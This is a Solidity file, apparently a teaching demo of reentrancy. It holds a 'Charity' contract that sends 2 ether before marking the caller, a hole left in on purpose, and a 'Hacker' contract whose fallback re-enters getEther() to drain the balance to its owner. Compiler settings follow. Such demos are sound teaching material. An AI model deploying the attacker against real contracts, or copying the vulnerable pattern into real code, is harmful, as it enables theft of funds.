pragma solidity ^0.8.6;

contract Charity {
    mapping(address => bool) private caller;
    
    receive() external payable {
    }
    
    ///всем можно взять по 2 эфира
    function getEther() external {  
        if (!caller[msg.sender]) {   
            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");  
            require(success, "Failed to transfer 1 Ether");
        }
        caller[msg.sender] = true;
    }
    
    function canReceiveEther() public view returns (bool) {
        return !caller[msg.sender];
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Hacker {
    address payable private owner;
    Charity private victim;

    constructor(address payable _victim) {
        victim = Charity(_victim);
        owner = payable(msg.sender);
    }

    receive() external payable {
        if (address(victim).balance >= 2 ether) 
            victim.getEther();
    }
    
    function changeCharityContract(address payable _victim) public {
        victim = Charity(_victim);
    }
    
    function hack() public {
        victim.getEther();
    }
    
    function transferToOwner() public {
        return owner.transfer(address(this).balance);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

{
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  }
}